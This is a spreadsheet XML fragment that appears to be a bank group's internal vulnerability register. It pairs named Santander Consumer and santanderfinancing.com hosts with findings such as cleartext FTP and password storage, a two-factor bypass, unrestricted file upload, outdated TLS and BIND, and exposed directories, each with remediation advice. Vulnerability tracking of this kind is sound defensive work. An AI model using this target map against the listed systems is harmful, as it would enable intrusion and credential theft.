    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/</t>
  </si>
  <si>
    <t>QA-WAS-b1d2c12f-9c36-489a-9b57-9649f1dd69d5</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/</t>
  </si>
  <si>
    <t>QA-WAS-00835fbe-01b0-4c8b-9e97-ec1dd1e236bc</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/</t>
  </si>
  <si>
    <t>QA-WAS-83fec3f3-d476-4e85-bf19-5b0358cae730</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/</t>
  </si>
  <si>
    <t>QA-WAS-db75d3c5-eca9-4b1c-994c-89c967b1808c</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/</t>
  </si>
  <si>
    <t>QA-WAS-ac06870b-cb49-4372-9123-1001a078980d</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/styles/</t>
  </si>
  <si>
    <t>QA-WAS-085b84e8-4189-4bb1-ba6c-5753ef51ccb2</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/styles/images/</t>
  </si>
  <si>
    <t>QA-WAS-92fa0ff1-87ee-4b6f-9680-d9fd9d854ed2</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/js/</t>
  </si>
  <si>
    <t>QA-WAS-16dd43b4-20cd-4f3a-a6e6-c231c48f1349</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi-Child/</t>
  </si>
  <si>
    <t>QA-WAS-a7961b13-8394-4bbf-9dc8-e434a7941dd9</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/</t>
  </si>
  <si>
    <t>QA-WAS-47372bb6-7789-48c0-bd55-6f86e0c85143</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/2024/</t>
  </si>
  <si>
    <t>QA-WAS-1ba2ab7c-8b0f-4414-b01c-85ced50d9f99</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/2024/10/</t>
  </si>
  <si>
    <t>QA-WAS-18d5c209-19f6-4af8-86b1-3bcddb8b11ab</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/2024/11/</t>
  </si>
  <si>
    <t>QA-WAS-d5ad46ef-2fb2-4128-8ab6-7ac8ff5eddb3</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/2024/12/</t>
  </si>
  <si>
    <t>QA-WAS-aaff92f8-fcdc-4e8b-8f86-4709e6bcc94f</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/et-fonts/</t>
  </si>
  <si>
    <t>QA-WAS-d53fd5ef-f1e4-4f79-a527-05d67dde452c</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/simply-static/</t>
  </si>
  <si>
    <t>QA-WAS-1def3467-6970-4a48-b662-7d83d0233aef</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/simply-static/temp-files/</t>
  </si>
  <si>
    <t>QA-WAS-6ab66b3d-ff1a-4b3d-83ee-eb3551bd3532</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/simply-static/temp-files/simply-static-1-1739986002/</t>
  </si>
  <si>
    <t>QA-WAS-1b73ba82-33bb-4081-a999-3a57c7a500ca</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-includes/</t>
  </si>
  <si>
    <t>QA-WAS-a216d79d-6b20-495a-a0bf-873605775fc4</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-includes/js/</t>
  </si>
  <si>
    <t>QA-WAS-40d154e1-c70c-495a-b985-1ef54b076f2d</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-includes/js/jquery/</t>
  </si>
  <si>
    <t>QA-WAS-05d6f918-f665-4e28-8ddc-35421de904ab</t>
  </si>
  <si>
    <t>https://www.santanderfinancing.com/icons/small/</t>
  </si>
  <si>
    <t>QA-WAS-56b638d9-6dff-46be-9685-2d40b841c5ac</t>
  </si>
  <si>
    <t>https://www.santanderfinancing.com/not-found/index.html</t>
  </si>
  <si>
    <t>Info</t>
  </si>
  <si>
    <t>QA-VM--8573038591486457342</t>
  </si>
  <si>
    <t>Remote Management Service Accepting Unencrypted Credentials Detected (FTP)</t>
  </si>
  <si>
    <t>7.3</t>
  </si>
  <si>
    <t>info.santanderconsumer.co</t>
  </si>
  <si>
    <t>Se ha detectado en el host de destino un servicio de gestión remota que acepta credenciales sin cifrar.
Se comprueban servicios como FTP con autenticación básica.</t>
  </si>
  <si>
    <t>Si es posible, utilice servicios alternativos que proporcionen cifrado.
Utilizando criptografía fuerte, haga que todas las credenciales de autenticación (como contraseñas/frases) sean ilegibles durante la transmisión.</t>
  </si>
  <si>
    <t>Sin Owner</t>
  </si>
  <si>
    <t>QA-VM--8461466396492180805</t>
  </si>
  <si>
    <t>ISC BIND Depletion of CPU Resources Vulnerability (CVE-2024-1975)</t>
  </si>
  <si>
    <t>7.5</t>
  </si>
  <si>
    <t>ISC BIND (Berkley Internet Domain Name) es una implementación de protocolos DNS.
Versiones afectadas:
BIND 9.0.0 -&gt; 9.11.37
BIND 9.16.0 -&gt; 9.16.50
BIND 9.18.0 -&gt; 9.18.27
BIND 9.19.0 -&gt; 9.19.24
Edición preliminar soportada por BIND 9.9.3-S1 -&gt; 9.11.37-S1
Versión preliminar compatible con BIND 9.16.8-S1 -&gt; 9.16.49-S1
Versión preliminar compatible con BIND 9.18.11-S1 -&gt; 9.18.27-S1
Versiones parcheadas:
BIND 9.18.28
BIND 9.20.0
Edición preliminar compatible con BIND 9.18.28-S1
Lógica de detección de QID: Esta comprobación no autenticada detecta los sistemas vulnerables obteniendo la información de la versión del servicio BIND mediante un banner.</t>
  </si>
  <si>
    <t>Se recomienda a los clientes que actualicen a la última versión parcheada de CVE-2024-1975
Parche:
A continuación se indican los enlaces para descargar los parches que corrigen las vulnerabilidades:
 CVE-2024-1975</t>
  </si>
  <si>
    <t>QA-VM-9029470641739675132</t>
  </si>
  <si>
    <t>QA-VM--1479287979499901669</t>
  </si>
  <si>
    <t>ISC BIND Slow Processing of Database Queries Vulnerability (CVE-2024-1737)</t>
  </si>
  <si>
    <t>ISC BIND (Berkley Internet Domain Name) is an implementation of DNS protocols.
Affected versions:
BIND 9.11.0 -&gt; 9.11.37
BIND 9.16.0 -&gt; 9.16.50
BIND 9.18.0 -&gt; 9.18.27
BIND 9.19.0 -&gt; 9.19.24
BIND Supported Preview Edition 9.11.4-S1 -&gt; 9.11.37-S1
BIND Supported Preview Edition 9.16.8-S1 -&gt; 9.16.50-S1
BIND Supported Preview Edition 9.18.11-S1 -&gt; 9.18.27-S1
Patched Versions:
BIND 9.18.28
BIND 9.20.0
BIND Supported Preview Edition 9.18.28-S1
QID Detection Logic:This unauthenticated check detects vulnerable systems by fetching the version information from the BIND service using banner.</t>
  </si>
  <si>
    <t>Customers are advised to upgrade to the patched version  latest release of CVE-2024-1737
Patch:
Following are links for downloading patches to fix the vulnerabilities:
 CVE-2024-1737</t>
  </si>
  <si>
    <t>QA-VM-3297268407910315434</t>
  </si>
  <si>
    <t>QA-VM--1878853719995110941</t>
  </si>
  <si>
    <t>Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo.
Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. 
La importancia de la capacidad Trace en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta Trace.
Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables.
Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo.
Track / Trace deben estar desactivados para cumplir con la normativa PCI.</t>
  </si>
  <si>
    <t>A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor.
Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond %{REQUEST_METHOD} ^TRACE
RewriteRule .* - [F]
&lt;/IfModule&gt;
Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original.
Una solución un poco más estricta es usar
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$
RewriteRule .* - [F]
&lt;/IfModule&gt;
Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable.
En el httpd.conf añada o modifique:
TraceEnable Off
Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro.
URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control.
Para más detalles sobre otros servidores web: Cert Advisory.</t>
  </si>
  <si>
    <t>QA-VM-478382902759804846</t>
  </si>
  <si>
    <t>QA-VM-119202962390829848</t>
  </si>
  <si>
    <t>QA-VM--429459081264403107</t>
  </si>
  <si>
    <t>QA-VM--7406095023816583372</t>
  </si>
  <si>
    <t>QA-VM--2124212459042238813</t>
  </si>
  <si>
    <t>QA-VM-148889184291175704</t>
  </si>
  <si>
    <t>QA-VM-6520935409158606894</t>
  </si>
  <si>
    <t>SSL Server Has SSLv3 Enabled Vulnerability</t>
  </si>
  <si>
    <t>SSL 3.0 es un protocolo obsoleto e inseguro.
El cifrado en SSL 3.0 utiliza el cifrado de flujo RC4 o un cifrado de bloque en modo CBC.
Se sabe que RC4 tiene sesgos, y el cifrado por bloques en modo CBC es vulnerable al ataque POODLE.
El protocolo SSLv3 es inseguro debido al ataque POODLE y a la debilidad del cifrado RC4.
Nota: En abril de 2016, PCI publicó PCI DSS v3.2 anunciando que el NIST ya no considera el protocolo Secure Socket Layers (SSL) v3.0 como aceptable para la protección de datos y que todas las versiones de las versiones SSL no cumplen con la definición PCI de «criptografía fuerte.»
 Este QID es un PCI FAIL automático de acuerdo con las normas PCI. 
Encontrará más información en: 
PCI: Guía del programa ASV v3.1 (página 27)
PCI: Uso de SSL Early TLS y escaneos ASV</t>
  </si>
  <si>
    <t>Desactive el protocolo SSL 3.0 en el cliente y en el servidor, consulte 
Cómo desactivar SSLv3 : Desactivar SSLv3</t>
  </si>
  <si>
    <t>QA-VM-3828429137492812662</t>
  </si>
  <si>
    <t>Secure Sockets Layer/Transport Layer Security (SSL/TLS) Server supports Transport Layer Security (TLSv1.0)</t>
  </si>
  <si>
    <t>TLS es capaz de utilizar una multitud de cifrados (algoritmos) para crear los pares de claves pública y privada.
Por ejemplo, TLSv1.0 utiliza el cifrado de flujo RC4 o un cifrado de bloque en modo CBC.
Se sabe que RC4 tiene sesgos y que el cifrado por bloques en modo CBC es vulnerable al ataque POODLE.
TLSv1.0, si se configura para utilizar los mismos conjuntos de cifrado que SSLv3, incluye un medio por el cual una implementación TLS puede degradar la conexión a SSL v3.0, debilitando así la seguridad.
También podría lanzarse un ataque de tipo POODLE directamente a TLS sin negociar un downgrade.
 Este QID es un PCI FAIL automático de acuerdo con los estándares PCI. 
Encontrará más detalles en: 
PCI: Guía del Programa ASV v3.1 (página 27)
PCI: Uso de TLS anticipado SSL y escaneos ASV</t>
  </si>
  <si>
    <t>Deshabilite el uso del protocolo TLSv1.0 en favor de un protocolo criptográficamente más fuerte como TLSv1.2.
Los siguientes comandos openssl se pueden utilizar para hacer una prueba manual:
openssl s_client -connect ip:port -tls1
Si la prueba tiene éxito, entonces el objetivo soporta TLSv1</t>
  </si>
  <si>
    <t>QA-VM-5628558436743707019</t>
  </si>
  <si>
    <t>QA-VM--6379084677383821471</t>
  </si>
  <si>
    <t>QA-VM-7544844098723306993</t>
  </si>
  <si>
    <t>QA-VM--4740830077408392703</t>
  </si>
  <si>
    <t>Expose_php Set to On in php.ini</t>
  </si>
  <si>
    <t>El escáner encontró información sobre la versión de PHP en las cabeceras devueltas por el servidor Web de destino habilitado para PHP. Esto probablemente significa que la variable expose_php está establecida en On en el archivo de configuración php.ini del servidor Web.</t>
  </si>
  <si>
    <t>Localice el archivo de configuración php.in en el host de destino y añádale este parámetro: expose_php=Off. Reinicie el servidor Web.</t>
  </si>
  <si>
    <t>QA-VM--6346726614849417284</t>
  </si>
  <si>
    <t>QA-VM-1556165667530165409</t>
  </si>
  <si>
    <t>QA-VM--441761257076188478</t>
  </si>
  <si>
    <t>QA-VM-1561738512585554183</t>
  </si>
  <si>
    <t>www.santanderfinancing.com</t>
  </si>
  <si>
    <t>QA-VM-5746922802870954912</t>
  </si>
  <si>
    <t>QA-VM--7830629651723387876</t>
  </si>
  <si>
    <t>El escáner encontró información sobre la versión de PHP en las cabeceras devueltas por el servidor Web de destino habilitado para PHP. Esto probablemente significa que la variable ;expose_php; está establecida en On; en el archivo de configuración php.ini; para el servidor Web.</t>
  </si>
  <si>
    <t>QA-VM--3482308921241785018</t>
  </si>
  <si>
    <t>QA-WAS-aa5d4263-aadd-42ce-8dbb-0a8c3bf586fe</t>
  </si>
  <si>
    <t>http://info.santanderconsumer.co/cgi-sys/suspendedpage.cgi</t>
  </si>
  <si>
    <t>Asegúrese de que el sitio web de destino es accesible sólo a través de HTTPS.
Si se reciben solicitudes que no sean HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen únicamente HTTPS al realizar solicitudes al servidor.</t>
  </si>
  <si>
    <t>QA-WAS-26532864-c38a-4b71-9f53-b5bba531a906</t>
  </si>
  <si>
    <t>SSL Certificate - Improper Usage Vulnerability</t>
  </si>
  <si>
    <t>https://info.santanderconsumer.co</t>
  </si>
  <si>
    <t>Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el Certificado del servidor y extrae la Clave Pública del Certificado para establecer la conexión segura.
La sección basicConstraints del certificado puede especificar si se trata de un certificado de Autoridad de Certificación (CA). Además, el campo keyUsage de la sección de extensiones X509v3 del certificado, si está presente, puede restringir el uso del certificado.
En general, una clave pública de servidor no debe utilizarse para la firma de certificados o CRL, y un certificado de cliente o CA no debe utilizarse como certificado de servidor.</t>
  </si>
  <si>
    <t>Por favor, instale un certificado de servidor con el uso correcto.</t>
  </si>
  <si>
    <t>QA-WAS-c18209a8-6150-47e6-84f4-82c1d8f45e6b</t>
  </si>
  <si>
    <t>https://info.santanderconsumer.co/cgi-sys/suspendedpage.cgi</t>
  </si>
  <si>
    <t>QA-WAS-86a0e551-8b79-4631-a358-368ced006411</t>
  </si>
  <si>
    <t>https://info.santanderconsumer.co/cgi-sys/suspendedpage.cgi?wsidchk=10341216&amp;pdata=https%253A%252F%252Finfo.santanderconsumer.co&amp;id=7fa3b767c460b54a2be4d49030b349c7&amp;ts=1742021878</t>
  </si>
  <si>
    <t>QA-WAS-c442b136-9edb-429a-8109-67c1ea9bc658</t>
  </si>
  <si>
    <t>https://info.santanderconsumer.co/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f?wsidchk=10341216&amp;pdata=https%253A%252F%252Finfo.santanderconsumer.co&amp;id=7fa3b767c460b54a2be4d49030b349c7&amp;ts=1742021878</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo secure.</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo secure a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS.</t>
  </si>
  <si>
    <t>santanderconsumer.co</t>
  </si>
  <si>
    <t>Cuando una Autoridad de Certificación (CA) emite un certificado, incorpora dos fechas: la fecha de inicio y la fecha de finalización de su validez. Si un cliente TLS (por ejemplo, un navegador web) se conecta a un servidor TLS (por ejemplo, un sitio web) y recibe un certificado caducado, se negará a conectarse. Los certificados son activos digitales que requieren renovación o descontinuación programada.
Huella dactilar SHA-256:
f669007e970e9597a1b49d5a25cc898cf138e89b4ef5399e2164bb62b50000bb
https://tools.ietf.org/html/rfc5280#section-4.1.2.5</t>
  </si>
  <si>
    <t>Public key size is less than 2048 bits</t>
  </si>
  <si>
    <t>s2._domainkey.santanderconsumer.co</t>
  </si>
  <si>
    <t>Utilice la implementación de OpenSSL o SSL que prefiera para generar un nuevo par de claves y especifique una seguridad de clave de 2048 bits o superior al generarlo. Implemente el par de claves más seguro en su configuración de DKIM.</t>
  </si>
  <si>
    <t>MAN-6847345dec176d522fbe77a2</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-002- VE-001</t>
  </si>
  <si>
    <t>Uso de versiones de software vulnerables</t>
  </si>
  <si>
    <t>4.8</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación utiliza una versión de GoAnywhere MFT que presenta vulnerabilidades conocidas. Sin embargo, no se ha podido detectar la versión exacta de la aplicación, con lo que no ha sido posible identificar hasta qué punto puede estar afectada. Tampoco ha sido posible llevar a cabo la explotación haciendo uso de exploits conocidos, con lo que se ha rebajado la criticidad de la vulnerabilidad.</t>
  </si>
  <si>
    <t>Se recomienda actualizar el producto GoAnywhere MFT a la última versión disponible (7.8.0 en el
momento de redactar este documento).</t>
  </si>
  <si>
    <t>Un atacante que logre evadir las restricciones de red de la CDN tras la que se encuentra el servidor,
o que se encuentre en un segmento de red desde el que pueda acceder a todos los puertos de éste
podría explotar las vulnerabilidades presentes en el mismo.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-002- CO-002</t>
  </si>
  <si>
    <t>Subida de ficheros arbitrarios</t>
  </si>
  <si>
    <t>El aplicativo permite la subida de ficheros sin restricciones. Esta funcionalidad presenta riesgos, ya que el hecho de no limitar las subidas a ciertos tipos de ficheros esperados (como documentos de texto, de Office, etcétera) puede  ermitir la subida y la distribución de contenido malicioso a través del servidor.</t>
  </si>
  <si>
    <t>Se recomienda configurar el servidor para aceptar únicamente extensiones de fichero conocidas.
Se recomienda también implementar un sistema de detección de contenido malicioso para denegar la subida de ficheros que puedan contener malware.</t>
  </si>
  <si>
    <t>Un atacante podría hacer uso del servidor para almacenar malware y después distribuirlo a otros
usuarios, aprovechando que la aplicación se trata de una fuente de confianza al pertenecer al Grupo
Santander.</t>
  </si>
  <si>
    <t>Experiencia</t>
  </si>
  <si>
    <t>QA-WAS-71ed93e2-1412-4e6f-b0cb-27771ad0e22e</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/content-cwv-embed/squidGuard.conf</t>
  </si>
  <si>
    <t>Validar</t>
  </si>
  <si>
    <t>QA-WAS-2e6073e3-e7c2-45c2-98bb-252290d69100</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/content-cwv-embed/static-1.1293/squidGuard.conf</t>
  </si>
  <si>
    <t>QA-WAS-423d6b06-55f2-405e-9338-066f7c14ed6b</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/content-cwv-embed/static-1.1293/squidGuard.conf.template</t>
  </si>
  <si>
    <t>QA-WAS-25aebb6b-433e-411a-b7ba-380d179d1bab</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/et-cache/6086/</t>
  </si>
  <si>
    <t>QA-WAS-5231fdc8-8f2b-45f5-9648-b99d334921d2</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel.old/</t>
  </si>
  <si>
    <t>QA-WAS-8a52b3f9-e09f-4896-a4e3-6aa0105046de</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel.old/scripts/</t>
  </si>
  <si>
    <t>QA-WAS-21fe3aa3-f392-4a65-b7c8-d813643f6005</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel.old/styles/</t>
  </si>
  <si>
    <t>QA-WAS-c0215114-6182-4b87-abf6-43f32e14a0e0</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/2025/</t>
  </si>
  <si>
    <t>QA-WAS-d7a5cd65-eb14-45d7-b39a-63d0007078c2</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/2025/03/</t>
  </si>
  <si>
    <t>QA-WAS-690c86af-d2bf-43df-b431-c6d2ceb1cc10</t>
  </si>
  <si>
    <t>QA-WAS-40e61983-cab6-4bac-b012-85d1ae84d824</t>
  </si>
  <si>
    <t>https://garantia.santanderconsumer.co/Home/</t>
  </si>
  <si>
    <t>QA-WAS-ba325842-44db-4858-bc1f-0ebb62047489</t>
  </si>
  <si>
    <t>https://garantia.santanderconsumer.co/Home/After</t>
  </si>
  <si>
    <t>QA-WAS-19473e4c-824b-4b5d-b11d-054a443addef</t>
  </si>
  <si>
    <t>QA-VM-8949831728521931337</t>
  </si>
  <si>
    <t>TCP Source Port Pass Firewall</t>
  </si>
  <si>
    <t>experiencia.santanderconsumer.co</t>
  </si>
  <si>
    <t>Your firewall policy seems to let TCP packets with a specific source port pass through.</t>
  </si>
  <si>
    <t>Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port.</t>
  </si>
  <si>
    <t>QA-WAS-a15d1c0d-57e0-41d5-bd24-8d7a61f3daee</t>
  </si>
  <si>
    <t>Bootstrap is a free and open source CSS framework directed at responsive web development. It contains HTML, CSS and JavaScript based design templates for typography, forms, buttons, navigation, and other interface components.
The web application is using a JavaScript library that is known to contain at least one vulnerability.</t>
  </si>
  <si>
    <t>Please refer to the information provided in the response section.  Also check the vendor's security advisories related to the vulnerable version of the library.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-005-AP001</t>
  </si>
  <si>
    <t>Cookies de sesión sin atributo Secure</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar, poniendo en riesgo el identificador de sesión del usuario cuando se encuentra en tránsito.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad "secure". De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados. La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación.</t>
  </si>
  <si>
    <t>MAN-685a86106c975521ca41233c</t>
  </si>
  <si>
    <t>SCO-25-CNAPA-003-AP-001</t>
  </si>
  <si>
    <t>Almacenamiento de credenciales en texto claro o con cifrado reversible</t>
  </si>
  <si>
    <t>La aplicación analizada almacena las contraseñas de los usuarios de la api en texto claro o mediante un cifrado reversible. De esta manera, cualquier atacante podría acceder de manera directa a las credenciales de los usuarios .</t>
  </si>
  <si>
    <t xml:space="preserve">Se debe almacenar la contraseña de los usuarios de manera segura y no se deben exponer
credenciales para otros entornos. </t>
  </si>
  <si>
    <t>De explotar esta vulnerabilidad, un atacante podría acceder a las credenciales de los usuarios almacenadas en la aplicación con la finalidad de suplantar a los usuarios legítimos en el aplicativo consiguiendo así acceso a otros entornos . Además, es posible que estas credenciales se puedan utilizar en otros aplicativos o servicios, lo que le permitiría a un atacante ampliar el alcance del ataque.</t>
  </si>
  <si>
    <t>MAN-685a86496c975521ca41233d</t>
  </si>
  <si>
    <t>SCO-25-CNAPA-003-AP-002</t>
  </si>
  <si>
    <t>Acceso a datos/operativas sensibles sin doble factor de autenticación</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha comprobado que la aplicación no consta de un sistema de autenticación de doble factor correctamente implementado ya que es posible el uso de la api principal sin utilizar el proceso de doble factor.</t>
  </si>
  <si>
    <t>Se recomienda implementar un sistema de doble factor de autenticación, basado en un token
aleatorio de un sólo uso, que genere una clave aleatoria cada 30 segundos para permitir al
usuario operar con las funcionalidades más críticas de la aplicación.</t>
  </si>
  <si>
    <t>Si no se protegen las operativas críticas del aplicativo mediante un segundo factor de autenticación un atacante con acceso a una sesión de usuario podría utilizar este tipo de operativas privilegiadas.</t>
  </si>
  <si>
    <t>SCO-25-CNAPA-003-AP-003</t>
  </si>
  <si>
    <t>Divulgación de información sensible en JSON Web Token</t>
  </si>
  <si>
    <t>El aplicativo auditado hace uso de la tecnología "JSON Web Token" para autenticar a los usuarios de la aplicación. Se ha observado que en el propio token JWT se envía información catalogada como sensible que puede ser accesible en texto claro.</t>
  </si>
  <si>
    <t>Se recomienda no incluir información sensible en el token JWT. En caso de incluir información
que pueda catalogarse como sensible se recomienda cifrar la información contenida en el
mismo o, en su defecto, cifrar la información sensible.</t>
  </si>
  <si>
    <t>Un atacante que consiga capturar un token JWT de un usuario legítimo de la aplicación puede
acceder a la información sensible transmitida en este token incluso aunque la validez del token
hubiera expirado</t>
  </si>
  <si>
    <t>SCO-25-CNAPA-003-AP-004</t>
  </si>
  <si>
    <t>Posibilidad de realizar ataques de fuerza bruta</t>
  </si>
  <si>
    <t>La aplicación no presenta ningún tipo de protección contra ataques de automatización de peticiones HTTP. De esta manera, un atacante podría automatizar la realización de numerosas peticiones sobre algunos parámetros de entrada de la aplicación con el objetivo de averiguar, mediante fuerza bruta, información de la misma como pudieran ser, nombres de usuario, credenciales, identificadores de usuario, etc.</t>
  </si>
  <si>
    <t>Se recomienda implementar un sistema que impida la automatización de peticiones como,
por ejemplo, un sistema de bloqueo por dirección IP ante un número de peticiones elevado
en un tiempo definido o un sistema tipo CAPTCHA, que se le presente al usuario después de
un número de intentos de averiguación del dato. Este umbral ha de ser ajustado dependiendo
del tipo de aplicación y la lógica de la misma, por ejemplo, mostrar el sistema CAPTCHA cuando
se exceda de 5 intentos de averiguación en menos de 1 minuto.</t>
  </si>
  <si>
    <t>De no bloquear los ataques automatizados de fuerza bruta, un atacante podría llevar a cabo con éxito la obtención de nombres de usuario de la aplicación, correos electrónicos válidos e incluso averiguar credenciales de un usuario legítimo de la aplicación.</t>
  </si>
  <si>
    <t>SCO-25-CNAPA-003-CO-005</t>
  </si>
  <si>
    <t>La vulnerabilidad "BREACH" es una instancia del ataque CRIME contra la compresión HTTP de tipo "gzip" o "DEFLATE"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t>
  </si>
  <si>
    <t>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cómo se deshabilita la compresión HTTP para Apache y NGINX:
Deshabilitar compresión en Apache:
• Deshabilite el módulo mod_deflate utilizando el siguiente comando:
 $ sudo a2dismod deflate
• Reinicie el servidor:
 $ sudo /etc/init.d/apache2 restart
Deshabilitar compresión en NGINX:
• Establezca la configuración del host con la opción gzip en off:
 server {
 server_name www.example.com;
 listen 443 ssl http2;
 gzip off;
 }</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>SCO-25-CNAPA-003-CO-006</t>
  </si>
  <si>
    <t>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 https://www.openssl.org/source/</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-004-CO-001</t>
  </si>
  <si>
    <t>https://bpm.santanderconsumer.co:8001/O
riginacionPROD/</t>
  </si>
  <si>
    <t xml:space="preserve">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t>
  </si>
  <si>
    <t>servicios santander</t>
  </si>
  <si>
    <t>SC-25-CNMPO-002-AP-001</t>
  </si>
  <si>
